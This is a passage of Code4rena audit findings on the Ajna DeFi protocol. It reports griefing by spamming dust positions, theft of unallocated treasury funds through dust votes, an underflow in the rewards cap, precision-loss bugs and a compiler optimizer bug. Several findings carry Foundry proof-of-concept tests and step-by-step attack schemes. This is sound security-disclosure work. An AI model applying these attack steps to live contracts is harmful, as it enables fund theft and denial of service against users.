[PositionManager.memorializePositions(params_)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216) method can be called by **anyone** (per design, see 3rd party test cases) and allows **insignificantly** small (any value > 0) positions to be attached to **anyone** else's positions NFT, see PoC. As a result, the `positionIndexes[params_.tokenId]` storage array for an NFT with given token ID can be spammed with positions without the NFT owner's consent.    Therefore, the [PositionManager.getPositionIndexesFiltered(tokenId_)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L466-L485) method might exceed the block gas limit when iterating the `positionIndexes[tokenId_]` storage array. However, the [RewardsManager.calculateRewards(...)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L325-L349) and [RewardsManager._calculateAndClaimRewards(...)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L384-L414) methods rely on the aforementioned method to succeed in order to calculate and pay rewards.  All in all, a griefer can spam anyone's position NFT with insignificant positions until the rewards mechanism fails for the NFT owner due to DoS (gas limit). Side note: A position NFT also cannot be burned as long as such insignificant positions are attached to it, see [PositionManager.burn(...)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L142-L154).   ## Proof of Concept  The following *diff* is based on the existing test case `testMemorializePositions` in `PositionManager.t.sol` and demonstrates that insignificant positions can be attached by anyone. ```diff diff --git a/ajna-core/tests/forge/unit/PositionManager.t.sol b/ajna-core/tests/forge/unit/PositionManager.t.sol index bf3aa40..56c85d1 100644 --- a/ajna-core/tests/forge/unit/PositionManager.t.sol +++ b/ajna-core/tests/forge/unit/PositionManager.t.sol @@ -122,6 +122,7 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract       */      function testMemorializePositions() external {          address testAddress = makeAddr(\"testAddress\"); +        address otherAddress = makeAddr(\"otherAddress\");          uint256 mintAmount  = 10000 * 1e18;           _mintQuoteAndApproveManagerTokens(testAddress, mintAmount); @@ -134,17 +135,17 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract           _addInitialLiquidity({              from:   testAddress, -            amount: 3_000 * 1e18, +            amount: 1, //3_000 * 1e18,              index:  indexes[0]          });          _addInitialLiquidity({              from:   testAddress, -            amount: 3_000 * 1e18, +            amount: 1, //3_000 * 1e18,              index:  indexes[1]          });          _addInitialLiquidity({              from:   testAddress, -            amount: 3_000 * 1e18, +            amount: 1, // 3_000 * 1e18,              index:  indexes[2]          });  @@ -165,17 +166,20 @@ contract PositionManagerERC20PoolTest is PositionManagerERC20PoolHelperContract           // allow position manager to take ownership of the position          uint256[] memory amounts = new uint256[](3); -        amounts[0] = 3_000 * 1e18; -        amounts[1] = 3_000 * 1e18; -        amounts[2] = 3_000 * 1e18; +        amounts[0] = 1; //3_000 * 1e18; +        amounts[1] = 1; //3_000 * 1e18; +        amounts[2] = 1; //3_000 * 1e18;          _pool.increaseLPAllowance(address(_positionManager), indexes, amounts);           // memorialize quote tokens into minted NFT +        changePrank(otherAddress); // switch other address (not owner of NFT)          vm.expectEmit(true, true, true, true); -        emit TransferLP(testAddress, address(_positionManager), indexes, 9_000 * 1e18); +        emit TransferLP(testAddress, address(_positionManager), indexes, 3 /*9_000 * 1e18*/);          vm.expectEmit(true, true, true, true);          emit MemorializePosition(testAddress, tokenId, indexes); -        _positionManager.memorializePositions(memorializeParams); +        _positionManager.memorializePositions(memorializeParams);  // switch back to test address (owner of NFT) +        changePrank(testAddress); +           // check memorialization success          uint256 positionAtPriceOneLP = _positionManager.getLP(tokenId, indexes[0]);  ```  ## Tools Used VS Code, Foundry  ## Recommended Mitigation Steps Requiring that The [PositionManager.memorializePositions(params_)](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L216) can only be called by the NFT owner or anyone who has approval would help but break the 3rd party test cases.   Alternatively, one could enforce a minimum position value to make this griefing attack extremely unattractive.    ## Assessed type  DoS"}, {"title": "It is possible to steal the unallocated part of every delegation period budget", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/465", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L316-L318   # Vulnerability details  Attacker can monitor the standard proposals distribution and routinely steal each low activity period remainder by submitting a `transfer to self` proposal and voting a dust amount for it.  Since the criteria for the final slate update is that any increase in total funding votes casted is enough, the attacker's costs are negligible, while the remainder funds during some periods can be substantial enough for the attacker to setup such a monitoring. I.e. as funds are constant share of the treasury, while activity can differ drastically, a situation when there are less viable proposals then funds can routinely happen over time.  The assumption of the current logic is that such unallocated funds will be returned to the treasury, but it will not be the case as the cost of stealing such funds is close to zero.  ## Impact  A part of treasury funds can be stolen each period and will not be available for ecosystem funding.  ## Proof of Concept  Schematic POC:  1. Bob monitors the end of each screening period and, whenever it is cheap enough, submits a proposal to send the remainder funds to self via proposeStandard() 2. Bob votes for it with fundingVote() with the dust votes he have. Since it is low activity period there are room, and it is included to `_topTenProposals` 3. Bob updates the top slate with updateSlate(), repeating current top slate with his proposal added. Since other proposals cumulatively do not allocate full budget and Bob's proposal have positive funding vote attached, it is included to the slate  This way Bob obtained the remainder funds nearly for free.  Core issue here looks to be the absence of the proposal votes threshold, which allows an attacker to claim the remained without any barrier to entry, i.e. having at hand only dust amount of governance tokens.  Even proposal with zero funding votes can be executed, it is only controlled to be non-negative:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441  ```solidity     function _validateSlate(uint24 distributionId_, uint256 endBlock, uint256 distributionPeriodFundsAvailable_, uint256[] calldata proposalIds_, uint256 numProposalsInSlate_) internal view returns (uint256 sum_) {         // check that the function is being called within the challenge period         if (block.number <= endBlock || block.number > _getChallengeStageEndBlock(endBlock)) {             revert InvalidProposalSlate();         }          // check that the slate has no duplicates         if (_hasDuplicates(proposalIds_)) revert InvalidProposalSlate();          uint256 gbc = distributionPeriodFundsAvailable_;         uint256 totalTokensRequested = 0;          // check each proposal in the slate is valid         for (uint i = 0; i < numProposalsInSlate_; ) {             Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];              // check if Proposal is in the topTenProposals list             if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();              // account for fundingVotesReceived possibly being negative >>          if (proposal.fundingVotesReceived < 0) revert InvalidProposalSlate(); ```  The only criteria for state update is greater sum of the funding votes:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L316-L318  ```solidity         // check if slate of proposals is better than the existing slate, and is thus the new top slate         newTopSlate_ = currentSlateHash == 0 || >>          (currentSlateHash!= 0 && sum > _sumProposalFundingVotes(_fundedProposalSlates[currentSlateHash])); ```  I.e. when the activity is low enough attacker can always maximize the `totalTokensRequested` to be exactly `gbc * 9 / 10`, claiming the difference to itself (i.e. the dust vote supplied proposal is to transfer unallocated part to attacker's account in this case):  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L445-L450  ```solidity             totalTokensRequested += proposal.tokensRequested;              // check if slate of proposals exceeded budget constraint ( 90% of GBC ) >>          if (totalTokensRequested > (gbc * 9 / 10)) {                 revert InvalidProposalSlate();             } ```  ## Recommended Mitigation Steps  Consider introducing the minimum accepted vote power for any proposal to be included in the final slate, as an example:  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441  ```diff     function _validateSlate(uint24 distributionId_, uint256 endBlock, uint256 distributionPeriodFundsAvailable_, uint256[] calldata proposalIds_, uint256 numProposalsInSlate_) internal view returns (uint256 sum_) {         ...  +       // using 0.1% of the total vote power used as a minimum for any winning proposal +       uint minFundingVotePower = _distributions[distributionId_].fundingVotePowerCast / 1000;         // check each proposal in the slate is valid         for (uint i = 0; i < numProposalsInSlate_; ) {             Proposal memory proposal = _standardFundingProposals[proposalIds_[i]];              // check if Proposal is in the topTenProposals list             if (_findProposalIndex(proposalIds_[i], _topTenProposals[distributionId_]) == -1) revert InvalidProposalSlate();              // account for fundingVotesReceived possibly being negative -           if (proposal.fundingVotesReceived < 0) revert InvalidProposalSlate(); +           if (proposal.fundingVotesReceived < 0 || Maths.wpow(SafeCast.toUint256(Maths.abs(proposal.fundingVotesReceived)), 2) < minFundingVotePower) revert InvalidProposalSlate(); ```   ## Assessed type  Invalid Validation"}, {"title": "Incorrect calculation of the remaining updatedRewards leads to possible underflow error", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/440", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-05"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L549 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L725   # Vulnerability details    ## Impact  `RewardsManage.sol` keeps track of the **total number of rewards collected per epoch** for all pools:  ```c File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol 73:    /// @dev `epoch => rewards claimed` mapping. 74:    mapping(uint256 => uint256) public override rewardsClaimed; 75:    /// @dev `epoch => update bucket rate rewards claimed` mapping. 76:    mapping(uint256 => uint256) public override updateRewardsClaimed; ```  And the `rewardsCap` calculation when calculating the reward applies only to the pool, which leads to a situation when the condition is fulfilled `rewardsClaimedInEpoch + updatedRewards_ >= rewardsCap`, **But `rewardsCap` is less than `rewardsClaimedInEpoch`**:  ```diff File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol  -543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod); 545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed. -546:         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) { 548:             // set claim reward to difference between cap and reward -549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit rewardsCapped can be less then  rewardsClaimedInEpoch_ 550:         }  719:         uint256 rewardsCap            = Maths.wmul(UPDATE_CAP, totalBurned); // @audit in one pool -720:        uint256 rewardsClaimedInEpoch = updateRewardsClaimed[curBurnEpoch]; 722:         // update total tokens claimed for updating bucket exchange rates tracker 723:         if (rewardsClaimedInEpoch + updatedRewards_ >= rewardsCap) { 724:              // if update reward is greater than cap, set to remaining difference -725:             updatedRewards_ = rewardsCap - rewardsClaimedInEpoch; // @audit rewardsCap can be less then rewardsClaimedInEpoch 726:         } 728:         // accumulate the full amount of additional rewards -729:        updateRewardsClaimed[curBurnEpoch] += updatedRewards_; // @audit increase per epoch ```  which causes an `underflow` erorr in the result `updatedRewards_ = rewardsCap - rewardsClaimedInEpoch` where `rewardsCap < rewardsClaimedInEpoch`, this error **leads to a transaction fail**, which will further temporarily/permanently block actions with NFT as `unstake/claimRewards` for pools in which `rewardsCap` will fail less than the total `rewardsClaimedInEpoch`  We have 2 instances of this problem::  1. during the call `_calculateNewRewards` 2. during the call `_updateBucketExchangeRates`  a failure in any of these will result in users of certain pools being unable to withdraw their NFTs as well as the reward  ## Proof of Concept  Let's take a closer look at the problem and why this is possible:  1. We have a general calculation of rewards taken per epoch:  ```javascript File: ajna-core\\src\\RewardsManager.sol  71:     /// @dev `epoch => rewards claimed` mapping. 72:     mapping(uint256 => uint256) public override rewardsClaimed; 73:     /// @dev `epoch => update bucket rate rewards claimed` mapping. 74:     mapping(uint256 => uint256) public override updateRewardsClaimed; ```  2. The state is updated for the epoch by the amount calculated for each pool:  ```javascript File: ajna-core\\src\\RewardsManager.sol  _calculateAndClaimRewards 396:         for (uint256 epoch = lastClaimedEpoch; epoch < epochToClaim_; ) {  410:             // update epoch token claim trackers 411:             rewardsClaimed[epoch]           += nextEpochRewards;  413:         }  _updateBucketExchangeRates 676:         uint256 curBurnEpoch = IPool(pool_).currentBurnEpoch();  728:                 // accumulate the full amount of additional rewards 729:                 updateRewardsClaimed[curBurnEpoch] += updatedRewards_; ```  3. At the time of calculation of the reward for the update:  ```diff File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol  526:         ( 527:             , 528:             // total interest accumulated by the pool over the claim period +529:             uint256 totalBurnedInPeriod, 530:             // total tokens burned over the claim period 531:             uint256 totalInterestEarnedInPeriod 532:         ) = _getPoolAccumulators(ajnaPool_, nextEpoch_, epoch_); 533: 534:         // calculate rewards earned                 ... 542: +543:         uint256 rewardsCapped = Maths.wmul(REWARD_CAP, totalBurnedInPeriod); 544: 545:         // Check rewards claimed - check that less than 80% of the tokens for a given burn event have been claimed. 546:         if (rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped) { 547: 548:             // set claim reward to difference between cap and reward +549:             newRewards_ = rewardsCapped - rewardsClaimedInEpoch_; // @audit 550:         } ```  We have a situation where `rewardsClaimedInEpoch_` has been updated by other pools to something like `100e18`, and `rewardsCapped` for the other pool was `30e18`, resulting in: ` rewardsClaimedInEpoch_ + newRewards_ > rewardsCapped` and of course we catch the underflow at the time of calculating the remainder, `30e18 - 100e18`, since there is no remainder `newRewards_ = rewardsCapped - rewardsClaimedInEpoch_`   To check the problem, you need to raise `rewardsClaimedInEpoch_` more than the `rewardsCap` of a certain pool, with the help of other pools,  `rewardsCap` is a percentage of burned tokens in the pool... so it's possible  ## Tools Used  - Manual review - Foundry  ## Recommended Mitigation Steps  - Add additional requirements that if `rewardsClaimedInEpoch > rewardsCap` that `updatedRewards_` should be zero, not need calculate remaining difference    ## Assessed type  Invalid Validation"}, {"title": "Delegate rewards system is unfair to delegates with less tokens and reduces decentralization", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/413", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-02"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L286 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L541 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L673 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L891   # Vulnerability details  ## Impact Reduces decentralization significantly and discourages delegates with less token power to vote.  ## Proof of Concept The current math gives delegates rewards based on the square of their votes. Thus, accounts with higher number of votes will be rewarded a bigger number of rewards, leading to less decentralization.  Add the following test to `StandardFunding.t.sol` ``` function test_POC_WhaleCanStealMostDelegateRewards() external {     // 24 tokenholders self delegate their tokens to enable voting on the proposals     _selfDelegateVoters(_token, _votersArr);      changePrank(_tokenDeployer);     _token.transfer(_tokenHolder1, 300_000_000 * 1e18);      vm.roll(_startBlock + 150);      // start distribution period     _startDistributionPeriod(_grantFund);      uint24 distributionId = _grantFund.getDistributionId();      (, , , uint128 gbc, , ) = _grantFund.getDistributionPeriodInfo(distributionId);      assertEq(gbc, 15_000_000 * 1e18);      TestProposalParams[] memory testProposalParams = new TestProposalParams[](1);     testProposalParams[0] = TestProposalParams(_tokenHolder1, 8_500_000 * 1e18);      // create 7 proposals paying out tokens     TestProposal[] memory testProposals = _createNProposals(_grantFund, _token, testProposalParams);     assertEq(testProposals.length, 1);      vm.roll(_startBlock + 200);      // screening period votes     _screeningVote(_grantFund, _tokenHolder1, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder1));     _screeningVote(_grantFund, _tokenHolder2, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder2));      /*********************/     /*** Funding Stage ***/     /*********************/      // skip time to move from screening period to funding period     vm.roll(_startBlock + 600_000);       // check topTenProposals array is correct after screening period - only six should have advanced     GrantFund.Proposal[] memory screenedProposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));      // funding period votes for two competing slates, 1, or 2 and 3     _fundingVote(_grantFund, _tokenHolder1, screenedProposals[0].proposalId, voteYes, 350_000_000 * 1e18);     _fundingVote(_grantFund, _tokenHolder2, screenedProposals[0].proposalId, voteYes, 50_000_000 * 1e18);      /************************/     /*** Challenge Period ***/     /************************/      uint256[] memory potentialProposalSlate = new uint256[](1);     potentialProposalSlate[0] = screenedProposals[0].proposalId;      // skip to the end of the DistributionPeriod     vm.roll(_startBlock + 650_000);      vm.expectEmit(true, true, false, true);     emit FundedSlateUpdated(distributionId, _grantFund.getSlateHash(potentialProposalSlate));     bool proposalSlateUpdated = _grantFund.updateSlate(potentialProposalSlate, distributionId);     assertTrue(proposalSlateUpdated);      /********************************/     /*** Execute Funded Proposals ***/     /********************************/      // skip to the end of the Distribution's challenge period     vm.roll(_startBlock + 700_000);      // execute funded proposals     _executeProposal(_grantFund, _token, testProposals[0]);      /******************************/     /*** Claim Delegate Rewards ***/     /******************************/      assertEq(_grantFund.getDelegateReward(distributionId, _tokenHolder1) / 1e18, 1_470_000);     assertEq(_grantFund.getDelegateReward(distributionId, _tokenHolder2) / 1e18, 30_000);      // _tokenHolder1 reward is approx 1_470_000/(1_470_000 + 30_000) ~ 98%      // linear distribution     // _tokenHolder1 reward is approx 350/(350 + 50) = 87.5% } ```  In this test, `_tokenHolder1` has 350/50 = 7 times more tokens and leads to getting 98% of the rewards. Had a linear distribution been used, `_tokenHolder1` would have received 87.5%, a fairer number.  In fact, it's even better to use a quadratic voting system, being the rewards the square root of the votes. This would incentivize more delegates and increase decentralization.  ## Tools Used Vscode, Foundry  ## Recommended Mitigation Steps Use a linear or [quadratic](https://axelar.network/blog/quadratic-voting-DAOs-dPoS-and-decentralization) delegate reward system.       ## Assessed type  Other"}, {"title": "_updateBucketExchangeRateAndCalculateRewards reward calculation accuracy loss", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/394", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L792-L801   # Vulnerability details  ## Impact  Divide first and then multiply, which has precision loss. The loss depends on the denominator, which is at most `denominator - 1`.    Although `Maths.wdiv rounded` adopted in _updateBucketExchangeRateAndCalculateRewards, reduce the loss, but theoretically `interestFactor` loss is about `interestEarned_ / 2`.          This means that the more interest are earned, the more users lose.     ## Proof of Concept  Modify for testing  ```diff diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol index 314b476..421940f 100644 --- a/ajna-core/src/RewardsManager.sol +++ b/ajna-core/src/RewardsManager.sol @@ -801,8 +801,12 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {                  rewards_ += Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wmul(burnFactor, interestFactor));              }          } + +        emit CalculateReward(rewards_);      }   +    event CalculateReward(uint256); +      /** @notice Utility method to transfer `Ajna` rewards to the sender       *  @dev   This method is used to transfer rewards to the `msg.sender` after a successful claim or update.       *  @dev   It is used to ensure that rewards claimers will be able to claim some portion of the remaining tokens if a claim would exceed the remaining contract balance. ```  Modify reward calculation  ```diff diff --git a/ajna-core/src/RewardsManager.sol b/ajna-core/src/RewardsManager.sol index 421940f..4cdfefa 100644 --- a/ajna-core/src/RewardsManager.sol +++ b/ajna-core/src/RewardsManager.sol @@ -792,13 +792,15 @@ contract RewardsManager is IRewardsManager, ReentrancyGuard {                  (, , , uint256 bucketDeposit, ) = IPool(pool_).bucketInfo(bucketIndex_);                    uint256 burnFactor     = Maths.wmul(totalBurned_, bucketDeposit); -                uint256 interestFactor = interestEarned_ == 0 ? 0 : Maths.wdiv( -                    Maths.WAD - Maths.wdiv(prevBucketExchangeRate, curBucketExchangeRate), -                    interestEarned_ -                );                    // calculate rewards earned for updating bucket exchange rate  -                rewards_ += Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wmul(burnFactor, interestFactor)); +                rewards_ += interestEarned_ == 0 ? 0 : Maths.wmul(UPDATE_CLAIM_REWARD, Maths.wdiv( +                    Maths.wmul( +                        Maths.WAD - Maths.wdiv(prevBucketExchangeRate, curBucketExchangeRate), +                        burnFactor +                    ), +                    interestEarned_ +                ));              }          } ```  ```shell forge test --match-test testClaimRewardsFuzzy -vvvv  For a Fuzzing input: indexes: 3 mintAmount: 73528480588506366763626  Divide first and multiply emit CalculateReward(: 334143554965844407584)  Multiply first and divide emit CalculateReward(: 334143554965846586903) ```  ## Tools Used  Foundry     ## Recommended Mitigation Steps  As modified above, multiply first and then divide.       ## Assessed type  Math"}, {"title": "Calculating new rewards is susceptible to precision loss due to division before multiplication", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/367", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-05"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/RewardsManager.sol#L519-L541   # Vulnerability details  This issue is similar to https://github.com/ajna-finance/audits/blob/main/sherlock/Contest1.md#issue-m-7-calculating-new-rewards-is-susceptible-to-precision-loss-due-to-division-before-multiplication which is not fixed properly. Still, the final multiplication is being performed after the division.  ## Impact Rewards may be lost (0) due to division before multiplication precision issues.  ## Proof of Concept The `RewardsManager._calculateNewRewards` function calculates the new rewards for a staker by first multiplying `interestEarned_` by `totalBurnedInPeriod` and then dividing by `totalInterestEarnedInPeriod` and then again multiplying by `REWARD_FACTOR` Since the division is being performed before the final multiplication, this can lead to precision loss.  ```solidity     function _calculateNewRewards(         address ajnaPool_,         uint256 interestEarned_,         uint256 nextEpoch_,         uint256 epoch_,         uint256 rewardsClaimedInEpoch_     ) internal view returns (uint256 newRewards_) {         (             ,             // total interest accumulated by the pool over the claim period             uint256 totalBurnedInPeriod,             // total tokens burned over the claim period             uint256 totalInterestEarnedInPeriod         ) = _getPoolAccumulators(ajnaPool_, nextEpoch_, epoch_);          // calculate rewards earned          newRewards_ = totalInterestEarnedInPeriod == 0 ? 0 : Maths.wmul(             REWARD_FACTOR,             Maths.wdiv(                 Maths.wmul(interestEarned_, totalBurnedInPeriod),                  totalInterestEarnedInPeriod             )         ); ```  ## Recommended Mitigation Steps All the multiplication should be performed in step 1 and then division at the end.   ## Assessed type  Math"}, {"title": "Precision loss in _getDelegateReward dillutes the delegate rewards", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/333", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden", "duplicate-293"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/StandardFunding.sol#L286-L292   # Vulnerability details  ## Impact  The Ajna voting delegation system currently allows for a precision loss in the `_getDelegateReward` function. This loss results in users who vote with a few tokens not receiving any rewards despite their votes being counted. This precision loss not only affects the rewards of small token holders but also dilutes the rewards of other participants. The rewards lost due to precision loss are reclaimed by the protocol and not distributed among other participants, violating the initial promise that 10% of the quarterly distribution would be awarded to delegates.   ## Proof of Concept  Ajna's primary funding mechanism awards 10% of the quarterly distribution to delegates. A token holder may delegate to themselves to capture this reward. However, due to a precision loss in the `_getDelegateReward` function, users voting with a few tokens won't receive any rewards, although their votes will be counted.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/StandardFunding.sol#L286-L292  ```solidity          rewards_ = Maths.wdiv(             Maths.wmul(                 currentDistribution_.fundsAvailable,                 votingPowerAllocatedByDelegatee             ),             currentDistribution_.fundingVotePowerCast         ) / 10; ```  This precision loss not only affects the rewards of small token holders but also dilutes the rewards of other participants. The awards lost due to precision loss are reclaimed by the protocol after the distribution period ends via the `_updateTreasury` function.  https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/StandardFunding.sol#L129-L139  ```solidity           if (currentDistributionId > 0 && (block.number > _getChallengeStageEndBlock(currentDistributionEndBlock))) {                 // Add unused funds from last distribution to treasury                 _updateTreasury(currentDistributionId);             }              // checks if any second last distribution exist and its unused funds are not added into treasury             if (currentDistributionId > 1 && !_isSurplusFundsUpdated[currentDistributionId - 1]) {                 // Add unused funds from second last distribution to treasury                 _updateTreasury(currentDistributionId - 1);             }         } ```  As a result, the invariant below doesn't **completely** hold anymore >10% of the quarterly distribution is awarded to delegates.    Here's a PoC where I slightly modified one of the already existing test cases to prove the point:  ```solidity  function testLowRewards() external {         _selfDelegateVoters(_token, _votersArr);          address lowRewardAddress = makeAddr(\"lowRewardAddress\");                  changePrank(_tokenDeployer);                  _token.transfer(lowRewardAddress, 10_000_000 * 1e18);         _token.transfer(_tokenHolder1, 150_000_000 * 1e18);          changePrank(lowRewardAddress);         _token.delegate(lowRewardAddress);          vm.roll(_startBlock + 150);          // start distribution period         _startDistributionPeriod(_grantFund);          uint24 distributionId = _grantFund.getDistributionId();           TestProposalParams[] memory testProposalParams = new TestProposalParams[](1);         testProposalParams[0] = TestProposalParams(_tokenHolder1, 500_000 * 1e18);          TestProposal[] memory testProposals = _createNProposals(_grantFund, _token, testProposalParams);          vm.roll(_startBlock + 200);          _screeningVote(_grantFund, lowRewardAddress, testProposals[0].proposalId, _getScreeningVotes(_grantFund, lowRewardAddress));                  _screeningVote(_grantFund, _tokenHolder1, testProposals[0].proposalId, _getScreeningVotes(_grantFund, _tokenHolder1));         // skip time to move from screening period to funding period         vm.roll(_startBlock + 600_000);           // check topTenProposals array is correct after screening period - only six should have advanced         GrantFund.Proposal[] memory screenedProposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));          _fundingVote(_grantFund, _tokenHolder1, screenedProposals[0].proposalId, voteYes, 200_000_000 * 1e18);         _fundingVote(_grantFund, lowRewardAddress, screenedProposals[0].proposalId, voteYes, 0.0001e18);         screenedProposals = _getProposalListFromProposalIds(_grantFund, _grantFund.getTopTenProposals(distributionId));                 vm.roll(_startBlock + 650_000);          uint256[] memory potentialProposalSlate = new uint256[](1);         potentialProposalSlate[0] = screenedProposals[0].proposalId;         _grantFund.updateSlate(potentialProposalSlate, distributionId);                   // skip to the end of the distribution's challenge period         vm.roll(_startBlock + 700_000);          // execute funded proposals         _executeProposal(_grantFund, _token, testProposals[0]);          console.log(_grantFund.getDelegateReward(distributionId, lowRewardAddress));         console.log(_grantFund.getDelegateReward(distributionId, _tokenHolder1));     } ```  This line of code  ``` _fundingVote(_grantFund, lowRewardAddress, screenedProposals[0].proposalId, voteYes, 0.0001e18); ```  Is there the **fundingVote** happens for a low reward user.  Running the PoC, yields the following result.   ![](https://i.imgur.com/DYrHE5B.png)   However, if we remove that line and rerun the test, the result looks like this:  ![](https://i.imgur.com/V33loAG.png)   My understanding is that even if the low amount token holder doesn't receive a reward, it shouldn't dillute the rewards of others.  As for categorization, even if there are loss of funds I think that's an edge case which can get extreme only in specific scenarios. So that's why I'm rating it as a Medium, but ultimately leaving to the judge to decide.   ## Tools Used  Manual review Discussion/confirmation with the Ajna Protocol team.  ## Recommended Mitigation Steps  The sponsor could improve the precision in the `_getDelegateReward` function to ensure that votes cast using a small number of tokens are correctly rewarded.  If the precision loss is not something the sponsor is concerned with, then the following option would be fair:  Adjust the distribution of rewards to ensure that precision loss does not dilute the rewards of other delegates. For example, this could involve distributing the lost rewards among the remaining participants rather than reclaiming them into the protocol treasury.      ## Assessed type  Math"}, {"title": "An Optimizer Bug in `PositionManager.getPositionIndexesFiltered`", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/306", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-06"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3   # Vulnerability details   ## Impact  There is an optimizer bug in `PositionManager.getPositionIndexesFiltered`. https://blog.soliditylang.org/2022/06/15/inline-assembly-memory-side-effects-bug/  The Yul optimizer considers all memory writes in the outermost Yul block that are never read from as unused and removes them. The bug is fixed in solidity 0.8.15. But `PositionManager.sol` uses solidity 0.8.14  ## Proof of Concept  There is an inline assembly block at the end of `PositionManager.getPositionIndexesFiltered`. The written memory is never read from in the same assembly block. It would trigger the bug to remove the memory write. https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L484 ```solidity     function getPositionIndexesFiltered(         uint256 tokenId_     ) external view override returns (uint256[] memory filteredIndexes_) {         \u2026          // resize array         assembly { mstore(filteredIndexes_, filteredIndexesLength) }     } ```  Unfortunately, `PositionManager` uses solidity 0.8.14 which would suffer from the bug. 